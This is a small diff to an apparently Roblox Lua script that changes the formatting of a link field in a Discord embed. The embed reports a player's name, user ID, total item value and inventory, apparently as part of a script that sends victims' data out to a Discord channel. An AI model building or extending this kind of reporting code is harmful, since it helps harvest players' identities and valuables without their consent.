@@ -223,7 +223,7 @@ local function sendToDiscord(link, brainrots)
                     fields = {
                         {name = "👤 Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
                         {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
-                        {name = "🔗 Script", value = "`" .. link .. "`"},
+                        {name = "🔗 Script", value = " " .. link .. " "},
                         {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
                     }
                 }}
